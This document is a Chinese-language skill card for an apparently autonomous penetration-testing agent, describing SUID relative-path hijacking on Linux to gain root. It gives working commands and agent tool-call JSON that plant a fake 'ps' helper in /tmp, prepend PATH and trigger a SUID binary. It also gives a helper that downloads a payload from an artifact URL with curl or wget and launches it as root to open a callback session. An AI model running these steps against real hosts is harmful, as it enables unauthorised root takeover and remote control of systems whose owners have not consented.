---
name: suid-path-hijack
handover: runtime
description: 替换被 SUID 程序调用的本地相对路径程序，经触发点执行并观察身份，取得最高权限身份。适用：先确认会话与路径状态，再写路径、触发、观察身份；三件事都进记录。
metadata:
  predicates:
  - path_hijack_root
  - suid_path_helper
  - T1574.007
  platforms:
  - linux
  keywords:
  - SUID路径劫持
  - SUID PATH劫持
  - SUID相对路径提权
  - SUID path hijacking
  - exploit.suid_path_hijack
  - method
  - position
  - cmd
  - code
  - msf
  - path_hijack_root
  - suid_path_helper
  - T1574.007
  - suid
  - path
  - hijack
  resources: []
  categories:
  - action-method
  aliases:
  - SUID
  - PATH hijack
  - 提权
  - suid
  parameters:
  - host
  - path
  when:
    method: local
  requires:
  - suid_binary
  excludes: []
  carriers:
  - shell
serves:
- suid_path_helper
- pathHijack
---

## 适用场景

目标为 Linux 主机，存在调用**相对路径**外部命令的 SUID 程序（例如 `system("ps")`）。当前身份须能写入 PATH 前置目录，并能控制该 SUID 进程的 `PATH`。

- 程序只调用绝对路径、或没有可写的前置目录时不适用。
- 执行点为目标本机，经已绑定的会话发送命令；控制端运行 Python 入口，标准工具机沿用 `python3` 与该会话对应的客户端。目标侧需 POSIX shell、`find`、`head`、`hostname`、`mkdir`、`echo` / `printf`、`chmod`、`id`、`cat`；观察调用时用 `strings`、`strace` 或源码。
- 先确认会话与路径状态，再写路径、触发、观察身份——三件事都要进记录，缺一件都下不了结论。
- 输入与工具面：图给 `path`；运行侧给 `session_ref`、`helper_name`、`suid_binary`（**不得杜撰**）；模型现场决定的输入：无；工具面 `shell` / `cmd` —— 目标侧命令写成 `{"tool":"run_command","target":"session","arguments":{"interpreter":"sh","command":"<一条命令行>"}}`，运行层在**本步绑定的那条会话**上执行并把回执原样带回。shell 原语与读法见 `skills/_tooling/posix-shell.md`。

## 参数

- 输入 `session_ref`：来自 runtime（可选）
- 输入 `path`：来自 model
- 输入 `helper_name`：来自 runtime（可选）
- 输入 `suid_binary`：来自 runtime（可选）
- 输入 `proof_path`：来自 config（可选）
- 交付：evidence
- 执行位置：position
- 可用工具：cmd、code、msf
- 图适用：case=path_hijack_root；service=suid_path_helper；technique=T1574.007

## 步骤

**进入条件（先看这条）**：本卡需要「适用场景」里声明的输入（目标、地址/端口、平台、执行面）已经由运行层给出；缺输入就先说明缺什么，不要换方法硬凑，也不要去起监听或新建会话。

**一条一个动作块；有依赖的步骤绝不合并。** 两个变体共用同一段劫持：**身份证据路由**（替换路径、触发、观察身份，交付触发后的身份证据）与**会话交付路由**（同一次劫持把通道升级成更高身份的会话，并**重新观察**可用性——会话可用性由重新观察得到，不由劫持动作本身推出）。

工具主路径：用 `find` 枚举 SUID 程序，把与被调用相对命令同名的 helper 写入可写目录，前置 `PATH` 后运行 SUID 程序，再读取证明：

```sh
ls -l /home/jobs/shell 2>/dev/null || find /home /opt /usr/local -perm -u=s -type f 2>/dev/null | head -20
printf '#!/bin/sh\nid -u > <proof>\nid >> <proof>\n' > <dir>/<name>
chmod +x <dir>/<name>
PATH=<dir>:$PATH <suid_binary>
cat <proof>
```

**不要在容器里 `find /` 全盘扫描**：它会跑过命令预算，整节点被判未确认。图里已经给出目标二进制时，直接用它；只在未知时才对 `/home /opt /usr/local` 做有限枚举。

**本部署实测（按手工标准）**：

- `suid_binary=/home/jobs/shell`；`/home/jobs/demo.c` 显示程序执行 `setuid(0); setgid(0); system("ps")`。
- `/home/jobs` 是 `root:root 755`，www-data 不可写；可写 helper 目录用 `/tmp`，helper 名 `ps`。
- 手工触发链（用 `stage` 写 helper，避免 `printf` 多行被 shell 拆坏）：
  ```text
  {"tool":"stage_file","target":"session","arguments":{"path":"/tmp/ps","text":"#!/bin/sh\nid -u > /tmp/agv_suid_proof\nid >> /tmp/agv_suid_proof\n"}}
  {"tool":"run_command","target":"session","arguments":{"interpreter":"sh","command":"chmod +x /tmp/ps && PATH=/tmp:$PATH /home/jobs/shell && cat /tmp/agv_suid_proof"}}
  ```
  证明文件首行必须是 `0`；不是 `0` 就说明劫持没有以 root 执行，停止后续步骤。
- `pathExists(..., write, root)` 是 **root 可写性事实**，不是“当前 www-data 可写”，也不是 helper 目录；不要把图里的 `path` 直接当可写目录。
- 会话交付时，把 helper 内容换成下载/启动本次 payload 的命令，仍把 helper 放在 `/tmp`，用 `PATH=/tmp:$PATH /home/jobs/shell` 触发。

参数：`session_ref` 来自运行现场；`path` 来自图，对应 `<dir>`，须为绝对可写目录；`helper_name` 来自运行现场，对应 `<name>`，默认 `ps`，应与观察到的相对命令名一致；`proof_path` 来自配置，对应 `<proof>`，省略时沿用入口既有默认；`suid_binary` 来自运行现场——显式给定时优先使用，未给定时优先取发现结果中首个非系统路径候选，没有这类候选时回退到首个候选。helper 与命令文件按上面步骤由现场给出并上传；`<helper_path>` / `<name>` / `<proof>` 是它们在执行点上的路径，由运行层给出（仓库里的 `skills/...` **不是**执行点路径）。

入口在同一会话内固定调用两次：先执行带数量上限的 SUID 枚举；再采集 `hostname`，用 `mkdir`、`echo` 写固定 helper，以前置 `PATH` 运行 SUID 程序并读取证明文件。补充方式保留 `LD_PRELOAD`（需目标程序允许加载）；`strace` 用于观察调用链。

**入口复用（本卡留下的可复用入口）**：劫持是**逐命令**成立的——拿到高身份靠的是“用前置 `PATH` 触发那个 SUID 程序”。所以本卡留下的入口是「写进 helper 的命令 → 触发 → 读回输出」这条**同一请求内**的链，由运行层那份随卡客户端完成（客户端落在**控制端**，不在目标上；helper 走 base64，命令里的引号/换行不会破坏外层行；输出落到可被同请求读回的证明文件）。

**本卡这一步自己跑的时候，不要去调用那个客户端**：`/tmp/agv-tools/…` 是**控制端**路径，在目标里不存在；这一步要发的是**触发线本身** —— 把 helper 写到目标侧可写目录（`printf … > /tmp/<名字>`）→ `chmod +x` → `PATH=<那个目录>:$PATH <SUID 程序>` → 读回输出。

卡面 `provides_position` 里的可写目录、helper 名与 SUID 程序是**本部署实测值**，换环境要按本页方法重新观察后再改；入口的探活判据是 `id -u` 返回 `0`。

**节点要求会话时（本节点产出 `execCode(...)`，必须交一条会话）**：身份证据只证明劫持成立，**不能替代会话**。一步一发：

**监听与弹头由运行层预置（本卡不再造子弹、不再起监听）**：运行层已按目标平台选好`delivery_payload`、分配回调端口、武装 handler，并用同一 payload 和同一端口生成了弹头。本卡只使用 `delivery_stager_path`、`delivery_artifact_url`、`delivery_remote_path`、`delivery_callback_host`、`delivery_callback_port`。

6. **起取件台（`cmd`，在控制端）**：`{"tool":"serve_file","target":"kali","arguments":{"directory":"<delivery_work_dir>","port":<delivery_fetch_port>}}`。
7. **用本卡入口取件并起载荷（`stage` + `cmd`，在本步绑定的执行面）**：**不能直接执行 stager**，否则它仍是 www-data。
   先把下载与启动写进 `/tmp/ps`，再由 SUID 程序以 root 拉起：

   ```text
   {"tool":"stage_file","target":"session","arguments":{"path":"/tmp/ps","text":"#!/bin/sh\n(curl -fsS <delivery_artifact_url> -o <delivery_remote_path> || wget -q <delivery_artifact_url> -O <delivery_remote_path>) && chmod +x <delivery_remote_path> && (setsid <delivery_remote_path >/dev/null 2>&1 </dev/null &)\n"}}
   {"tool":"run_command","target":"session","arguments":{"interpreter":"sh","command":"chmod +x /tmp/ps && PATH=/tmp:$PATH /home/jobs/shell && echo agv-payload-started"}}
   ```

   回执须含 `agv-payload-started`；会话由运行层认领，Post 会重新观测 `id -un` 是否为 `root`。
8. **收尾**：引本次回执 → `finish`；**会话由运行层认领、登记并探活，本卡不自己登记**。

**本卡的完成依据是「交付段」最后一步的回执**（载荷被目标取到并启动 / 会话已交付）：命令回显、PoC 成功、文件读取、身份证据都只是**中间观察**，**不能**用来判 `action_complete=true`。拿到交付段最后一步的回执即判 `passed` 且 `action_complete=true`，**不要再追加任何「确认会话」的探测**（监听列表、连接数、端口都不是完成依据）；会话的认领、登记与探活由运行层负责，它认领不到会**如实记录未确认**，那不是让你在本卡里继续试的理由。


## 完成依据

**`finish.verdict` 判本卡要求的事实是否成立（这次劫持是否让命令以目标身份执行），不是“命令是否退出 0”。**

三个阻断闸为 `freshness`、`target`、`identity`，`effect_rule=null`。

- **freshness**：核对调用状态、证据与本次 `call_id` 的对应关系及已携带 marker；证明文件与 helper 输出须来自本次调用。
- **target**：核对 `hostname` 采集的 `host` 与目标主机上下文。
- **identity**：注册规则 `uid_after==0` —— 入口优先读证明文件首行的整数；取不到时从本次运行输出中的 `uid=` 读取；**不得从退出码推断**。

证据字段：`call_id`、`host`、`suid_binary`、`uid_after`，原始输出为 `stdout`；核对选定程序、证明文件与 helper 输出；会话交付路由另有会话引用与可用性观察记录。

- **pass**：三个阻断闸均为 pass。
- **unsatisfied**：已取得的 `uid_after` 非零，或任一阻断闸返回 unsatisfied —— 事实被明确否定。
- **uncertain**：没有阻断闸返回 unsatisfied，但身份、目标或本次调用证据缺失——缺证据即不确定，不猜填。

## 失败条件

- **停止边界：本卡一次调用只做上面那条触发链；完成即结束，不由本卡重试、追加动作或换卡。**
- 直接执行 SUID shell 可能因某些 shell 的保护而降权，不能仅凭 SUID 位或某个参数判断取得 root；沿用命令文件与证明文件核对。
- helper 每次调用须覆盖重写，避免使用上次残留；证明文件与输出仍须核对本次调用归属。
- 先用 `strings` 或源码确认程序调用的相对命令名，再确定 helper 名；未发现候选时入口停在发现阶段，不触发后续操作。
- 全盘 `find` 在大文件系统上可能很慢；方法层可用已知目录缩小范围，当前 fixed 入口仍沿用既有发现命令。
- 执行会留下 helper 与证明文件，并改变本次 SUID 进程的 `PATH` 环境；入口没有自动清理步骤，清理与留痕写入报告并核对实际文件与环境变化；需要复原时由编排另行处理。

[共享执行规则](../../src/skills/templates/execution_rules.txt)
